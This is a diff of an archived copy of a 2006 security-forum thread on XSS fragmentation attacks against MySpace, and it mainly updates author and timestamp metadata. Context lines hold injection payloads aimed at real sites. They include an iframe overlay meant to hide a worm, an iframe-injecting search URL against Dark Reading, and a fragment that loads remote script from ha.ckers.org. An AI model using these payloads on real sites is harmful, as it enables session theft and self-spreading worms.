@@ -5,22 +5,24 @@ resource: "http://sla.ckers.org/forum/read.php?13,2033"
 tags: [article, webseclist-reference, EN, sla-ckers-org]
 generated:
   by: webseclist-refs/1
-  at: "2026-08-09T10:26:25+00:00"
+  at: "2026-08-11T17:45:33+00:00"
 status: stable
-stale_after: 2027-08-09
+stale_after: 2027-08-11
 sources:
   - id: original
     resource: "http://sla.ckers.org/forum/read.php?13,2033"
     title: XSS Fragmentation Attacks + MySpace 0day
+    author: kuza55
   - id: capture
     resource: "https://web.archive.org/web/20120605165348/http://sla.ckers.org/forum/read.php?13,2033"
 also_at: []
-authors: []
+authors:
+  - kuza55
 canonical_url: ""
 cited_by:
   - "2006.md:37"
 commit: ""
-content_sha256: 5546749793f0f49c1b50a4ac1aa4af3c1936482eaf23386e936f7ea50866cf1d
+content_sha256: 4aa4a1cd0225d8053e0f8a133f00b4c5533067162c732a8b1f7e6d1cc89fc029
 depth: full
 depth_reason: default
 kind: article
@@ -33,7 +35,7 @@ publisher_english: ""
 raw_sha256: d5a11612a5c888b72a38d32b064a2c02747a40fbef20d75c2a794fe334f1ecc0
 retrieved_from: "http://sla.ckers.org/forum/read.php?13,2033"
 retrieved_kind: stored
-retrieved_utc: "2026-08-09T10:26:25+00:00"
+retrieved_utc: "2026-08-11T17:45:33+00:00"
 slug: sla-ckers-org-xss-fragmentation-attacks-myspace-0day
 snapshot: 20120605165348
 title_english: ""
@@ -43,11 +45,11 @@ translation_of: ""
 
 # XSS Fragmentation Attacks + MySpace 0day
 
-**XSS Fragmentation Attacks + MySpace 0day** - Author not stated, sla.ckers.org.
+**XSS Fragmentation Attacks + MySpace 0day** - kuza55, sla.ckers.org.
 
 - Published: date not stated
 - Original: <http://sla.ckers.org/forum/read.php?13,2033>
-- Preserved from: http://sla.ckers.org/forum/read.php?13,2033 (stored) on 2026-08-09
+- Preserved from: http://sla.ckers.org/forum/read.php?13,2033 (stored) on 2026-08-11
 - Capture timestamp: 20120605165348
 - Licence: unknown
 
@@ -207,8 +209,6 @@ Sadly/Luckily (depending on your viewpoint) manyfilters such as the ones employe
 
  Edited 1 time(s). Last edit at 10/22/2006 02:44AM by kuza55.
 
- 
-
 **Re: XSS Fragmentation Attacks + MySpace 0day**
 
 Posted by: ** [ Kyran ](http://sla.ckers.org/forum/profile.php?13,63) **
@@ -218,8 +218,6 @@ Date: October 22, 2006 03:08AM
 Excellent article. I never thought about this as an attack vector before!
 
  - [Kyran](http://kyran.wordpress.com)
-
- 
 
 **Re: XSS Fragmentation Attacks + MySpace 0day**
 
@@ -232,8 +230,6 @@ Good stuff.
  Don't forget our IRC: irc://irc.irchighway.net/#slackers
  -[WhiteAcid](http://www.whiteacid.org) - your friendly, very lazy, web developer
 
- 
-
 **Re: XSS Fragmentation Attacks + MySpace 0day**
 
 Posted by: ** [ maluc ](http://sla.ckers.org/forum/profile.php?13,50) **
@@ -243,8 +239,6 @@ Date: October 22, 2006 09:23AM
 indeed, a very interesting attack scenario.. good job ^^
 
  -maluc
-
- 
 
 **Re: XSS Fragmentation Attacks + MySpace 0day**
 
@@ -257,8 +251,6 @@ Very clever. I've seen this a few times in the wild. It's nice to see a good wri
  - RSnake
  Gotta love it. [http://ha.ckers.org](http://ha.ckers.org/)
 
- 
-
 **Re: XSS Fragmentation Attacks + MySpace 0day**
 
 Posted by: ** [ Kyran ](http://sla.ckers.org/forum/profile.php?13,63) **
@@ -269,8 +261,6 @@ Yeah it was definetely clever. A good example of why one should not use contextu
 
  - [Kyran](http://kyran.wordpress.com)
 
- 
-
 **Re: XSS Fragmentation Attacks + MySpace 0day**
 
 Posted by: ** [ lpilorz ](http://sla.ckers.org/forum/profile.php?13,68) **
@@ -278,8 +268,6 @@ Posted by: ** [ lpilorz ](http://sla.ckers.org/forum/profile.php?13,68) **
 Date: October 22, 2006 02:14PM
 
 I tried something similar some time ago, but didn't get a working real-world example yet. Thanks, kuza55!
-
- 
 
 **Re: XSS Fragmentation Attacks + MySpace 0day**
 
@@ -294,8 +282,6 @@ Wow.. nice find.
  for example: executeSearch('anythinghere');
 
  Edited 1 time(s). Last edit at 10/22/2006 08:56PM by Disciple.
-
- 
 
 **Re: XSS Fragmentation Attacks + MySpace 0day**
 
@@ -318,8 +304,6 @@ Here's a way to use a script with filtered functions and make it unnoticable:
 
  <script>//ajax worm goes here!</script><iframe src="http://myspace.com/yourprofile?xss" style="width:100%;height:100%;position:absolute;top:0;left:0;border:0;z-index:100;"></iframe>
 
- 
-
 **Re: XSS Fragmentation Attacks + MySpace 0day**
 
 Posted by: ** [ rsnake ](http://sla.ckers.org/forum/profile.php?13,2) **
@@ -330,8 +314,6 @@ Nicely done. Yet another reason not to use Myspace. Ugh!
 
  - RSnake
  Gotta love it. [http://ha.ckers.org](http://ha.ckers.org/)
-
- 
 
 **Re: XSS Fragmentation Attacks + MySpace 0day**
 
@@ -344,8 +326,6 @@ You were looking for reasons to not use it?
  Don't forget our IRC: irc://irc.irchighway.net/#slackers
  -[WhiteAcid](http://www.whiteacid.org) - your friendly, very lazy, web developer
 
- 
-
 **Re: XSS Fragmentation Attacks + MySpace 0day**
 
 Posted by: ** [ rsnake ](http://sla.ckers.org/forum/profile.php?13,2) **
@@ -356,8 +336,6 @@ No, but I happen to collect reasons why data mining companies shouldn't be trust
 
  - RSnake
  Gotta love it. [http://ha.ckers.org](http://ha.ckers.org/)
-
- 
 
 **Re: XSS Fragmentation Attacks + MySpace 0day**
 
@@ -372,8 +350,6 @@ It still works:
 
  One day there will be something here... http://int2e.com
 
- 
-
 **Re: XSS Fragmentation Attacks + MySpace 0day**
 
 Posted by: ** [ rsnake ](http://sla.ckers.org/forum/profile.php?13,2) **
@@ -384,8 +360,6 @@ Article on the topic: http://www.darkreading.com/document.asp?doc_id=108161&f_sr
 
  - RSnake
  Gotta love it. [http://ha.ckers.org](http://ha.ckers.org/)
-
- 
 
 **Re: XSS Fragmentation Attacks + MySpace 0day**
 
@@ -399,8 +373,6 @@ Hmmm. Ironically, Darkreading is kinda vulnerable to the same thing...
 
  http://www.darkreading.com/search.asp?search_type=content&search_request=yes&search_value=%3Ciframe+src%3Dhttp%3A%2F%2Fsla.ckers.org+&start_date=&end_date=§ion_type=></iframe>News+Analysis&taxonomy=livedefault&topics=livedefault&doc_author=livedefault&action=Search
 
- 
-
 **Re: XSS Fragmentation Attacks + MySpace 0day**
 
 Posted by: ** [ rsnake ](http://sla.ckers.org/forum/profile.php?13,2) **
@@ -412,8 +384,6 @@ Nice find! And to make it a little better/run JS: http://www.darkreading.com/sea
  - RSnake
  Gotta love it. [http://ha.ckers.org](http://ha.ckers.org/)
 
- 
-
 **Re: XSS Fragmentation Attacks + MySpace 0day**
 
 Posted by: ** [ fogez ](http://sla.ckers.org/forum/profile.php?13,153) **
@@ -423,8 +393,6 @@ Date: October 25, 2006 02:13PM
 Wow. I think darkreading lurks here...
 
  It now filters out iframe :)
-
- 
 
 **Re: XSS Fragmentation Attacks + MySpace 0day**
 
@@ -440,8 +408,6 @@ to the darkreading admin who reads this.. you do a good job a addressing holes q
 
  -maluc
 
- 
-
 **Re: XSS Fragmentation Attacks + MySpace 0day**
 
 Posted by: ** [ fogez ](http://sla.ckers.org/forum/profile.php?13,153) **
@@ -452,8 +418,6 @@ Span, object, div are also still available. Wierdly, the admin does filter the '
 
  And I agree - excellent speed on the fix!
 
- 
-
 **Re: XSS Fragmentation Attacks + MySpace 0day**
 
 Posted by: ** [ kuza55 ](http://sla.ckers.org/forum/profile.php?13,163) **
@@ -462,8 +426,6 @@ Date: October 27, 2006 06:54PM
 
 Well, even though MySpace implemented a 'fix' to this issue, its still very much epxloitable, I've posted details here:
  [[kuza55.blogspot.com](http://kuza55.blogspot.com/2006/10/myspace-xss-fragmentation-again.html)]
-
- 
 
 **Re: XSS Fragmentation Attacks + MySpace 0day**
 
@@ -475,8 +437,6 @@ It would be really helpful to see a PoC... let me know if you can create one, I'
 
  - RSnake
  Gotta love it. [http://ha.ckers.org](http://ha.ckers.org/)
-
- 
 
 **Re: XSS Fragmentation Attacks + MySpace 0day**
 
@@ -500,8 +460,6 @@ My observations of the changes made are that they simply check to see if there i
 Not knowing the internals of the filter my best guess as to what the programatic changes were would be that they use a regex to filter out event handlers (so anything of the form on*=) if its inside a tag. They now seem to use the same regex if a single quote is found in an input field.
 ```
 
- 
-
 **Re: XSS Fragmentation Attacks + MySpace 0day**
 
 Posted by: ** [ rsnake ](http://sla.ckers.org/forum/profile.php?13,2) **
@@ -512,8 +470,6 @@ So it only works in IE? Not that that's a big deal, really, given the penetratio
 
  - RSnake
  Gotta love it. [http://ha.ckers.org](http://ha.ckers.org/)
-
- 
 
 **Re: XSS Fragmentation Attacks + MySpace 0day**
 
@@ -537,8 +493,6 @@ x.src='http://ha.ckers.org/s.js';document.appendChild(x)">
 
  -maluc
 
- 
-
 **Re: XSS Fragmentation Attacks + MySpace 0day**
 
 Posted by: ** [ kuza55 ](http://sla.ckers.org/forum/profile.php?13,163) **
@@ -548,8 +502,6 @@ Date: October 27, 2006 11:33PM
 Yep, it only works in IE, and AFAIK only in IE 6 at that, but like you said considering the market share IE has, and more specifically the market share IE would have on a site like MySpace, it shouldn't really matter.
 
  Even an exploit that only worked on Firefox would still be something you'd want to fix on your site, because 10% is still quite a large number of people......
-
- 
 
 **Re: XSS Fragmentation Attacks + MySpace 0day**
 
@@ -582,8 +534,6 @@ asdf' asdflkeiw 'blah' weoe "banana" >
 
 ```
 
- 
-
 **Re: XSS Fragmentation Attacks + MySpace 0day**
 
 Posted by: ** [ maluc ](http://sla.ckers.org/forum/profile.php?13,50) **
@@ -593,8 +543,6 @@ Date: October 27, 2006 11:46PM
 it works in IE7 as well
 
  -maluc
-
- 
 
 **Re: XSS Fragmentation Attacks + MySpace 0day**
 
@@ -610,8 +558,6 @@ and lol, with that realization .. style='blah' works fine.
 
  -maluc
 
- 
-
 **Re: XSS Fragmentation Attacks + MySpace 0day**
 
 Posted by: ** [ kuza55 ](http://sla.ckers.org/forum/profile.php?13,163) **
@@ -621,8 +567,6 @@ Date: October 28, 2006 12:05AM
 Ah, I thought that grave accents had been deprecated in IE7, thanks for clarifying that.
 
  Mmm, I went through all the CSS attack vectors on the cheatsheet and the only one which they allowed through was behavior: which needs a locally hosted .htc file, and it has to be a .htc file, you can't use an image file or similar, so I'm not really anticipating anything further using XSS Fragmentation, even if they just do a dodgy fix where they filter out event handlers if you have a grave accent in an input field....
-
- 
 
 **Re: XSS Fragmentation Attacks + MySpace 0day**
 
